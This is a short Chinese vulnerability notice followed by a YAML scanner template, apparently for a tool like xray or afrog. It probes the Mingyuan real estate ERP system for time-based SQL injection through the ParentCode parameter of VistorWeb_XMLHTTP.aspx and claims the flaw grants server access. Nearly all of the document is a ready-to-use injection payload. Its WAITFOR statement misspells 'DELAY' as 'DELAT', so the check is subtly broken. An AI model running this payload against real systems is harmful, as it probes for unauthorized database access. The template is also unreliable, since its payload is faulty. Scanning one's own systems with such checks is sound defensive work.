漏洞描述：明源地产ERP系统具有丰富的房地产行业经验和定制化功能,可以适应不同企业的需求。该系统存在sqI注 入漏洞，可获取服务器权限

```
relative: req0 && req1
session: false
requests:
- method: GET
timeout: 13
path: /cgztbweb/VisitorWeb/VistorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAT%20'0:0:5'--&ywtype=GETParentProjectName
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
follow_redirects: true
matches: (time.gt("5")) && time.lt("10")
- method: GET
timeout: 10
path: /cgztbweb/VisitorWeb/VistorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAT%20'0:0:0'--&ywtype=GETParentProjectName
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
follow_redirects: true
matches: time.lt("5")

```

